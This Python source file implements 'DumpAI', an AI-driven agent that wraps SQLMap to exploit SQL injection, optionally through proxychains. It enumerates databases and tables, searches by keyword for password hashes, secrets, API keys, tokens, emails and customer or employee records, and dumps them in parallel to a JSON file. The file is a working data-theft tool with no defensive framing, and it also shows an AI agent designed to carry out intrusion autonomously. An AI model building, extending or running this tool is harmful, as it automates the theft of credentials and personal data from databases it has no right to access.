"""DumpAI Agent - Autonomous extraction loop."""
import json
import os
import re
import shlex
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from typing import Any, Dict, List, Optional, Tuple

try:
    from .memory import Memory
    from .tools import (
        EnumerateDBs, EnumerateTables, GetColumns, SearchTables, SearchColumns,
        DumpTable, DumpColumns, AnalyzeSchema, AnalyzeColumns
    )
except ImportError:
    from memory import Memory
    from tools import (
        EnumerateDBs, EnumerateTables, GetColumns, SearchTables, SearchColumns,
        DumpTable, DumpColumns, AnalyzeSchema, AnalyzeColumns
    )


class Colors:
    NORD0 = '\033[38;2;46;52;64m'
    NORD1 = '\033[38;2;59;66;82m'
    NORD3 = '\033[38;2;76;86;106m'
    NORD4 = '\033[38;2;216;222;233m'
    NORD7 = '\033[38;2;143;188;187m'
    NORD8 = '\033[38;2;136;192;208m'
    NORD9 = '\033[38;2;129;161;193m'
    NORD10 = '\033[38;2;94;129;172m'
    NORD11 = '\033[38;2;191;97;106m'
    NORD12 = '\033[38;2;208;135;112m'
    NORD13 = '\033[38;2;235;203;139m'
    NORD14 = '\033[38;2;163;190;140m'
    NORD15 = '\033[38;2;180;142;173m'
    
    HEADER = NORD15
    BLUE = NORD10
    CYAN = NORD8
    GREEN = NORD14
    WARNING = NORD13
    FAIL = NORD11
    END = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    
    FROST = NORD8
    AURORA = NORD14
    SNOW = NORD4


BANNER = f"""
{Colors.FROST}
    ██████╗ ██╗   ██╗███╗   ███╗██████╗  █████╗ ██╗
    ██╔══██╗██║   ██║████╗ ████║██╔══██╗██╔══██╗██║
    ██║  ██║██║   ██║██╔████╔██║██████╔╝███████║██║
    ██║  ██║██║   ██║██║╚██╔╝██║██╔═══╝ ██╔══██║██║
    ██████╔╝╚██████╔╝██║ ╚═╝ ██║██║     ██║  ██║██║
    ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═╝     ╚═╝  ╚═╝╚═╝{Colors.END}

{Colors.AURORA}  ❄ AI-Powered Autonomous Data Extractor{Colors.END}
{Colors.SNOW}  v2.1 - Nordic Theme{Colors.END}
"""


SEARCH_PATTERNS = {
    "user_data": ["employee", "admin", "user", "staff", "member", "account"],
    "customer_data": ["customer", "client", "address", "order"],
    "sys_data": ["config", "setting", "option", "connection"],
    "api_key": ["api", "key", "token", "oauth", "credential"],
    "email_pass": ["user", "member", "account", "login"]
}

COLUMN_PATTERNS = {
    "credentials": ["pass", "pwd", "hash", "password", "secret"],
    "emails": ["email", "mail", "e_mail"],
    "api_keys": ["api_key", "token", "secret", "key"],
    "usernames": ["login", "username", "user", "name"]
}


class DumpAgent:
    """Autonomous agent for intelligent data extraction."""
    
    def __init__(self, command: str, categories: Optional[List[str]] = None,
                 output_dir: str = "dumpai_out", max_parallel: int = 5,
                 verbose: bool = False, smart_search: bool = False):
        
        self.config = self._parse_command(command)
        self.categories = categories or ["user_data", "sys_data"]
        self.output_dir = output_dir
        self.max_parallel = max_parallel
        self.verbose = verbose
        self.smart_search = smart_search
        self.injection_type = "unknown"
        
        os.makedirs(output_dir, exist_ok=True)
        
        self.memory = Memory()
        self.memory.current_database = self.config.get("database", "")
        
        self._init_tools()
    
    def _parse_command(self, cmd: str) -> Dict:
        """Parse SQLMap command into config."""
        config = {
            "prefix": "",
            "sqlmap_path": "sqlmap",
            "request_file": "",
            "parameter": "",
            "database": "",
            "dbms": "mysql",
            "extra_flags": []
        }
        
        proxy_match = re.match(r'(proxychains\S*\s+-\S+\s+)', cmd)
        if proxy_match:
            config["prefix"] = proxy_match.group(1)
        
        sqlmap_match = re.search(r'(python3?\s+\S*sqlmap[^\s]*\.py)', cmd)
        if sqlmap_match:
            config["sqlmap_path"] = sqlmap_match.group(1)
        
        r_match = re.search(r'-r\s+["\']?([^"\'\s]+)["\']?', cmd)
        if r_match:
            config["request_file"] = r_match.group(1)
        
        try:
            tokens = shlex.split(cmd)
            for i, token in enumerate(tokens):
                if token == '-p' and i + 1 < len(tokens):
                    next_token = tokens[i + 1]
                    if not next_token.startswith('-'):
                        config["parameter"] = next_token
                    break
        except ValueError:
            p_match = re.search(r'-p\s+([a-zA-Z0-9_\[\]]+)', cmd)
            if p_match:
                config["parameter"] = p_match.group(1)
        
        d_match = re.search(r'-D\s+(\S+)', cmd)
        if d_match:
            config["database"] = d_match.group(1)
        
        dbms_match = re.search(r'--dbms[=\s]+(\S+)', cmd)
        if dbms_match:
            config["dbms"] = dbms_match.group(1)
        
        return config
    
    def _init_tools(self):
        """Initialize all tools."""
        self.tools = {
            "enumerate_dbs": EnumerateDBs(self.config, verbose=self.verbose),
            "enumerate_tables": EnumerateTables(self.config, verbose=self.verbose),
            "get_columns": GetColumns(self.config, verbose=self.verbose),
            "search_tables": SearchTables(self.config, verbose=self.verbose),
            "search_columns": SearchColumns(self.config, verbose=self.verbose),
            "dump_table": DumpTable(self.config, verbose=self.verbose),
            "dump_columns": DumpColumns(self.config, verbose=self.verbose),
            "analyze_schema": AnalyzeSchema(self.config, verbose=self.verbose),
            "analyze_columns": AnalyzeColumns(self.config, verbose=self.verbose)
        }
    
    def _detect_injection_type(self, raw_output: str) -> str:
        """Detect injection type from SQLMap output."""
        output_lower = raw_output.lower()
        
        if "time-based blind" in output_lower or "AND SLEEP" in raw_output:
            return "time_based"
        elif "boolean-based blind" in output_lower:
            return "boolean_blind"
        elif "error-based" in output_lower:
            return "error_based"
        elif "union" in output_lower:
            return "union"
        elif "stacked queries" in output_lower:
            return "stacked"
        
        return "unknown"
    
    def _is_slow_injection(self) -> bool:
        """Check if injection type is slow (blind/time-based)."""
        return self.injection_type in ["time_based", "boolean_blind"]
    
    def _get_search_patterns(self) -> List[str]:
        """Get combined search patterns based on categories."""
        patterns = set()
        for category in self.categories:
            if category in SEARCH_PATTERNS:
                patterns.update(SEARCH_PATTERNS[category])
        return list(patterns)
    
    def _smart_search_tables(self, database: str) -> List[str]:
        """Use --search to find tables by pattern (faster for blind injections)."""
        self._log("Using Smart Search mode (blind injection detected)", "INFO")
        
        patterns = self._get_search_patterns()
        if not patterns:
            patterns = ["user", "admin", "config"]
        
        self._log(f"Searching tables by patterns: {', '.join(patterns[:5])}...", "INFO")
        
        result = self._execute_tool("search_tables", patterns=patterns)
        
        if result and result.success and result.data:
            tables = []
            for item in result.data:
                if '.' in item:
                    table_name = item.split('.')[-1]
                else:
                    table_name = item
                tables.append(table_name)
            return list(set(tables))
        
        return []
    
    def _smart_search_columns(self) -> List[dict]:
        """Use --search to find columns by pattern."""
        all_patterns = []
        for patterns in COLUMN_PATTERNS.values():
            all_patterns.extend(patterns)
        
        unique_patterns = list(set(all_patterns))[:10]
        
        self._log(f"Searching columns by patterns: {', '.join(unique_patterns[:5])}...", "INFO")
        
        result = self._execute_tool("search_columns", patterns=unique_patterns)
        
        if result and result.success and result.data:
            return result.data
        
        return []
    
    def _log(self, msg: str, level: str = "INFO"):
        """Log message with Nordic color theme."""
        timestamp = datetime.now().strftime("%H:%M:%S")
        
        colors = {
            "INFO": Colors.NORD8,
            "WARNING": Colors.NORD13,
            "ERROR": Colors.NORD11,
            "DEBUG": Colors.NORD3,
            "SUCCESS": Colors.NORD14,
            "DATA": Colors.NORD9,
            "PHASE": Colors.NORD15
        }
        
        symbols = {
            "INFO": "◆",
            "WARNING": "⚠",
            "ERROR": "✗",
            "DEBUG": "○",
            "SUCCESS": "❄",
            "DATA": "▸",
            "PHASE": "━"
        }
        
        color = colors.get(level, Colors.NORD4)
        symbol = symbols.get(level, "◆")
        
        line = f"{Colors.NORD3}[{timestamp}]{Colors.END} {color}[{symbol}]{Colors.END} {color}{msg}{Colors.END}"
        print(line)
    
    def _phase_header(self, title: str):
        """Print Nordic-styled phase header."""
        width = 60
        border = f"{Colors.NORD10}{'━' * width}{Colors.END}"
        title_line = f"{Colors.FROST}  ❄ {title}{Colors.END}"
        print()
        print(border)
        print(title_line)
        print(border)
    
    def _execute_tool(self, tool_name: str, **params) -> Optional[Any]:
        """Execute a tool and record in memory."""
        tool = self.tools.get(tool_name)
        if not tool:
            self._log(f"Unknown tool: {tool_name}", "ERROR")
            return None
        
        if self.verbose:
            self._log(f"Executing: {tool_name} with {params}", "DEBUG")
        
        result = tool.execute(**params)
        
        self.memory.add_action(
            tool=tool_name,
            params=params,
            result=result.data if result.success else None,
            success=result.success,
            execution_time=result.execution_time
        )
        
        if not result.success and result.error:
            self.memory.add_error(tool_name, result.error, params)
        
        return result
    
    def run(self):
        """Main agent loop."""
        print(BANNER)
        start_time = time.time()
        
        self._phase_header("AUTONOMOUS EXTRACTION")
        self._log(f"Request: {self.config['request_file']}")
        self._log(f"Parameter: {self.config['parameter']}")
        self._log(f"Categories: {', '.join(self.categories)}")
        self._log(f"Smart Search: {'ON' if self.smart_search else 'AUTO'}")
        self._log(f"Output: {self.output_dir}")
        print()
        
        database = self.config.get("database")
        if not database:
            self._log("Enumerating databases...")
            result = self._execute_tool("enumerate_dbs")
            if result and result.success and result.data:
                database = result.data[0]
                self.memory.databases = result.data
                self.memory.current_database = database
                self._log(f"Using database: {database}", "SUCCESS")
                
                if result.raw_output:
                    self.injection_type = self._detect_injection_type(result.raw_output)
                    if self.injection_type != "unknown":
                        self._log(f"Injection type: {self.injection_type}", "INFO")
            else:
                self._log("Could not enumerate databases", "ERROR")
                return
        
        self._phase_header("PHASE 1: TABLE DISCOVERY")
        
        use_smart_search = self.smart_search or self._is_slow_injection()
        
        if use_smart_search:
            self._log("Smart Search enabled - using pattern-based table search", "INFO")
            tables = self._smart_search_tables(database)
            
            if not tables:
                self._log("Smart search found nothing, falling back to full enumeration", "WARNING")
                result = self._execute_tool("enumerate_tables", database=database)
                if result and result.success:
                    tables = result.data
        else:
            result = self._execute_tool("enumerate_tables", database=database)
            if not result or not result.success:
                self._log("Could not enumerate tables", "ERROR")
                return
            tables = result.data
            
            if result.raw_output:
                self.injection_type = self._detect_injection_type(result.raw_output)
        
        if not tables:
            self._log("No tables found", "ERROR")
            return
        
        self.memory.tables = tables
        self._log(f"Found {len(tables)} tables", "SUCCESS")
        
        self._phase_header("PHASE 2: AI SCHEMA ANALYSIS")
        
        result = self._execute_tool(
            "analyze_schema",
            database=database,
            tables=tables,
            categories=self.categories
        )
        
        if result and result.success and result.data:
            self.memory.stats["ai_calls"] += 1
            analysis = result.data
            
            self.memory.cms_detected = analysis.get("cms_detected", "Unknown")
            self.memory.database_type = analysis.get("database_type", "custom")
            self.memory.extractions = analysis.get("extractions", [])
            
            self._log(f"CMS Detected: {self.memory.cms_detected}", "SUCCESS")
            self._log(f"Database Type: {self.memory.database_type}", "INFO")
            self._log(f"Extraction targets: {len(self.memory.extractions)}", "SUCCESS")
        else:
            self._log("AI analysis failed, using pattern matching", "WARNING")
            self.memory.extractions = self._fallback_analysis(tables)
        
        self._phase_header("PHASE 3: PARALLEL EXTRACTION")
        
        extraction_plan = {}
        for ext in self.memory.extractions:
            table = ext.get("table")
            category = ext.get("category")
            columns = ext.get("columns", [])
            
            if table and category and category in self.categories:
                if table not in extraction_plan:
                    extraction_plan[table] = []
                extraction_plan[table].append((category, columns))
        
        if not extraction_plan:
            self._log("No extraction targets, nothing to do", "WARNING")
            return
        
        self._log(f"Processing {len(extraction_plan)} tables...")
        
        def process_table(table: str, plans: List[Tuple[str, List[str]]]) -> Dict:
            """Process single table."""
            table_results = {}
            
            result = self._execute_tool("get_columns", database=database, table=table)
            
            if not result or not result.success:
                dump_result = self._execute_tool("dump_table", database=database, table=table)
                if dump_result and dump_result.success:
                    for cat, _ in plans:
                        table_results[cat] = dump_result.data
                return table_results
            
            all_columns = result.data
            self.memory.columns_cache[table] = all_columns
            
            col_result = self._execute_tool(
                "analyze_columns",
                table=table,
                columns=all_columns,
                categories=self.categories
            )
            
            if col_result and col_result.success and col_result.data:
                self.memory.stats["ai_calls"] += 1
                recs = col_result.data.get("recommended_extractions", [])
                
                for rec in recs:
                    cat = rec.get("category")
                    cols = rec.get("columns", [])
                    
                    if cat and cat in self.categories and cols:
                        valid_cols = [c for c in cols if c in all_columns]
                        if valid_cols:
                            dump_result = self._execute_tool(
                                "dump_columns",
                                database=database,
                                table=table,
                                columns=valid_cols
                            )
                            
                            if dump_result and dump_result.success:
                                table_results[cat] = dump_result.data
            else:
                for cat, specified_cols in plans:
                    cols = specified_cols if specified_cols else all_columns
                    dump_result = self._execute_tool(
                        "dump_columns",
                        database=database,
                        table=table,
                        columns=cols
                    )
                    
                    if dump_result and dump_result.success:
                        table_results[cat] = dump_result.data
            
            self.memory.stats["tables_processed"] += 1
            return table_results
        
        with ThreadPoolExecutor(max_workers=self.max_parallel) as executor:
            futures = {
                executor.submit(process_table, table, plans): table
                for table, plans in extraction_plan.items()
            }
            
            for future in as_completed(futures):
                table = futures[future]
                try:
                    table_results = future.result()
                    
                    for cat, rows in table_results.items():
                        if rows:
                            self.memory.add_extracted_data(cat, rows, table)
                            self._log(f"[{table}] Extracted {len(rows)} rows for {cat}", "DATA")
                            
                except Exception as e:
                    self._log(f"Error processing {table}: {e}", "ERROR")
        
        self._phase_header("EXTRACTION COMPLETE")
        
        self.memory.stats["duration"] = time.time() - start_time
        self._save_results()
        
        summary = self.memory.get_summary()
        print()
        print(f"{Colors.SNOW}  ┌{'─' * 40}┐{Colors.END}")
        print(f"{Colors.SNOW}  │{Colors.FROST} ❄ SUMMARY{Colors.SNOW}{' ' * 30}│{Colors.END}")
        print(f"{Colors.SNOW}  ├{'─' * 40}┤{Colors.END}")
        print(f"{Colors.SNOW}  │{Colors.END} Duration:        {Colors.NORD8}{summary['duration']:.1f}s{Colors.END}{' ' * (22 - len(f'{summary[\"duration\"]:.1f}s'))}│")
        print(f"{Colors.SNOW}  │{Colors.END} Tables:          {Colors.NORD14}{summary['tables_processed']}{Colors.END}{' ' * (22 - len(str(summary['tables_processed'])))}│")
        print(f"{Colors.SNOW}  │{Colors.END} Rows:            {Colors.NORD14}{summary['rows_extracted']}{Colors.END}{' ' * (22 - len(str(summary['rows_extracted'])))}│")
        print(f"{Colors.SNOW}  │{Colors.END} AI Calls:        {Colors.NORD9}{summary['ai_calls']}{Colors.END}{' ' * (22 - len(str(summary['ai_calls'])))}│")
        print(f"{Colors.SNOW}  └{'─' * 40}┘{Colors.END}")
        
        for cat, count in summary["data_by_category"].items():
            if count > 0:
                self._log(f"  {cat}: {count} records", "DATA")
    
    def _fallback_analysis(self, tables: List[str]) -> List[Dict]:
        """Fallback pattern-based analysis."""
        extractions = []
        
        patterns = {
            "user_data": ["user", "admin", "employee", "staff", "member", "account"],
            "customer_data": ["customer", "client", "order", "address"],
            "email_pass": ["user", "member", "account"],
            "api_key": ["api", "key", "token", "auth", "oauth", "credential"],
            "sys_data": ["config", "setting", "option", "connection", "server"]
        }
        
        for table in tables:
            table_lower = table.lower()
            for category in self.categories:
                if category in patterns:
                    for pattern in patterns[category]:
                        if pattern in table_lower:
                            extractions.append({
                                "table": table,
                                "category": category,
                                "columns": [],
                                "priority": "medium",
                                "reason": f"Pattern match: {pattern}"
                            })
                            break
        
        return extractions
    
    def _save_results(self):
        """Save all results to single file."""
        output = {
            "meta": {
                "session_id": self.memory.session_id,
                "timestamp": datetime.now().isoformat(),
                "database": self.memory.current_database,
                "cms": self.memory.cms_detected,
                "duration": self.memory.stats.get("duration", 0),
                "tables_processed": self.memory.stats["tables_processed"],
                "rows_extracted": self.memory.stats["rows_extracted"]
            },
            "data": self.memory.extracted_data,
            "summary": self.memory.get_summary()
        }
        
        output_file = os.path.join(self.output_dir, "dump_all.json")
        with open(output_file, 'w') as f:
            json.dump(output, f, indent=2, default=str)
        
        self._log(f"Results saved: {output_file}", "SUCCESS")
        
        session_file = os.path.join(self.output_dir, f"session_{self.memory.session_id}.json")
        self.memory.save(session_file)
        self._log(f"Session saved: {session_file}", "INFO")
